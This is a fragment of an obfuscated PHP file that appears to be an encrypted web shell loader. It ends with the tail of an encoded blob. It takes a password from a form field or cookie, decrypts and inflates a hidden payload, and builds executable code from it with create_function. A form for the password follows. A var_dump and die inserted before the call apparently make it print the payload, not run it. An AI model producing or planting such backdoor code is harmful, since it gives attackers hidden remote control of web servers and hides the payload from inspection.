...
Lf3xR6Y=
'));
$l__l_ = isset($_POST['l__l_']) ? $_POST['l__l_'] : (isset($_COOKIE['l__l_']) ? $_COOKIE['l__l_'] : NULL);
if ($l__l_ !== NULL) {
    $l__l_ = md5($l__l_) . substr(md5(strrev($l__l_)), 0, strlen($l__l_));
    for ($l____l_ = 0; $l____l_ < 15185; $l____l_++) {
        $l___l_[$l____l_] = chr((ord($l___l_[$l____l_]) - ord($l__l_[$l____l_])) % 256);
        $l__l_ .= $l___l_[$l____l_];
    }
    if ($l___l_ = @gzinflate($l___l_)) {
        if (isset($_POST['l__l_'])) {
            @setcookie('l__l_', $_POST['l__l_']);
        }

        $l____l_ = create_function('', $l___l_);
        var_dump(@gzinflate($l___l_));
        die;
        unset($l___l_, $l__l_);
        $l____l_();
    }
}?>
<form action="" method="post"><input type="text" name="l__l_" value=""/><input type="submit" value="&gt;"/></form>